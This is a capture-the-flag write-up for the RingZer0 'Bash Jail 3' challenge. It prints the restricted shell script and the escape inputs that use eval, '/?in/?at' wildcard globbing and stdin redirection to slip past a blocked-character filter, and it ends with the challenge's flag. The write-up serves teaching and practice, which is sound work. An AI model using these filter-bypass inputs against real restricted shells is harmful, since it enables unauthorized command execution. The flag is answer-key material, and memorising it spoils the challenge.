# Bash Jail 3

## Challenge Details 

- **CTF:** RingZer0
- **Category:** Jail Escaping
- **Points:** 3

## Provided Materials

- SSH Credentials

## Solution

Challenge bash code:

```sh
WARNING: this prompt is launched using ./prompt.sh 2>/dev/null

function check_space {
	if [[ $1 == *[bdksc]* ]]
	then 	
    		return 0
	fi

	return 1
}

while :
do
	echo "Your input:"
	read input
	if check_space "$input" 
	then
		echo -e '\033[0;31mRestricted characters has been used\033[0m'
	else
		output=`$input` &>/dev/null
		echo "Command executed"
	fi
done 
```

Standart output and error streams are closed *(`&>/dev/null`)*, so we can use standart input stream *(`>&0`)*. We will also use [eval](https://unix.stackexchange.com/questions/23111/what-is-the-eval-command-in-bash) to execute arguments as a shell command. We can't execute `cat` command directly, but we can use wildcards to call the command:

```sh
Your input:
eval /?in/?at flag.txt >&0
FLAG-s9wXyc9WKx1X6N9G68fCR0M78sx09D3j
```

Or we can use [uniq](https://man7.org/linux/man-pages/man1/uniq.1.html): 

```sh
Your input:
eval uniq flag.txt >&0
FLAG-s9wXyc9WKx1X6N9G68fCR0M78sx09D3j
```


## Final Flag

`FLAG-s9wXyc9WKx1X6N9G68fCR0M78sx09D3j`

*Created by [bu19akov](https://github.com/bu19akov)*